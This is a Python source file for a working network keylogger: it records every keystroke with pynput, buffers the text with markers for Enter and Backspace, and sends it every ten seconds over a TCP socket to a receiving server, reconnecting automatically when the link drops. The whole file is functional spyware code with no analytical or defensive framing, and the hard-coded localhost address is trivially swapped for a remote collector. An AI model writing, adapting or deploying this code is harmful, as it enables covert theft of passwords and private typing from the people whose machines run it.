from pynput.keyboard import Key, Listener
from threading import Timer
import socket, time, sys
#make a socket

ip = "127.0.0.1"
port = 4040

def make_socket():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def newtimer():
    global t
    t = Timer(10.0, send_string)

write_string = ""    
is_restarting = True
def send_string():
    if is_restarting == False:
        try:
            global write_string
            print("Send string to server ", write_string)
            s.send(bytes(write_string, "UTF-8"))
            write_string = ""
        except:
            print("Sending was not succesfull")
        else:
            print("Sending was succesfull")
            
#trying to connect... if no errors receive the servers message
reconnect_attempt = 1
connection = False
def connect():
    global connection
    global reconnect_attempt
    while True:
        try:
            print("Trying to connect")
            make_socket()
            s.connect((ip, port)) #Connect to the receiver
        except Exception:
            connection = False
            if reconnect_attempt <= 20:
                print(f"Connecting failed! Trying again in 5 seconds. Try {reconnect_attempt}/20")
                reconnect_attempt = reconnect_attempt + 1
                time.sleep(5) #if failed try again in 5 seconds
            else:
                print("Reconnection failed. Closing the program")
                sys.exit()
        else:
            newtimer()
            connection = True
            msg = s.recv(1024)
            print(msg.decode("UTF-8")) #if succesful receive the servers message and continue :)
            reconnect_attempt = 1
            break
connect()



# keyboard capturing
def on_release_of_key(key):
    global write_string
    if key == Key.space:
        write_string += " "
        print(write_string)
    # Add space to the string if the key is space
    elif key == Key.shift or key == Key.shift_r or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.tab or key == Key.caps_lock or key == Key.alt_l or key == Key.alt_r or key == Key.esc:
        write_string += ""
    #Ignore these keys
    elif key == Key.enter:
        write_string += "(EN)"
        print(write_string)
    #Add "(EN)" if Enter is pressed
    elif key == Key.backspace:
        write_string += "(BS)"
        print(write_string)
    #Add "(BS)" if backspace is pressed
    else:
        write_string += str(key).replace("'", "") #Remove the single quotes from the str(key)
        print(write_string) #Show the current string
    #If above are not true add the key to the string

def on_press(key):
    global is_restarting
    is_restarting = True #Change the bool because when t.start is called it runs the send_string() function for some reason...
    t.cancel()
    newtimer()
    t.start()
    is_restarting = False

def start_keyboard_listener():
    global listener
    listener = Listener(on_release=on_release_of_key, on_press=on_press) #start the keyboard listener
    listener.start()
start_keyboard_listener()

while True: #Reconnection
    try:
        s.send(bytes("test", "UTF-8"))
    except:
        s.close()
        #Stop timer and keyboard listener
        t.cancel()
        listener.stop()
        #Run the connect function which makes a new timer if the connecting was succesful
        connect()
        #Start the timer and make a new keyboard listener
        t.start()
        start_keyboard_listener()
    else:
        time.sleep(1)
